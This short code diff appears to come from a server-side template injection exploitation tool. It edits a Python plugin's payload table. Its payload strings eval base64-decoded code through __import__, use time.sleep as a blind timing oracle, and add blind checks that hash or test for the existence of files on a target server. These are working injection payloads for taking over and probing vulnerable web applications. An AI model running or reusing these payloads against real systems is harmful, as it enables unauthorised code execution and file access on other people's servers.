@@ -54,7 +54,7 @@ class Python(Plugin):
                 'evaluate_blind': """str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))"""
             },
             'evaluate_blind': {
-                'call': 'evaluate',
+                'call': 'inject',
                 'evaluate_blind': """eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode()) and __import__('time').sleep({delay})"""
             },
             'execute': {
@@ -91,6 +91,11 @@ class Python(Plugin):
             'md5': {
                 'call': 'evaluate',
                 'md5': """__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()"""
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': '''__import__("hashlib").md5(open("{path}", 'rb').read()).hexdigest()=="{md5}"''',
+                'exists_blind': '''__import__("os").path.isfile("{path}")'''
             },
         })
 
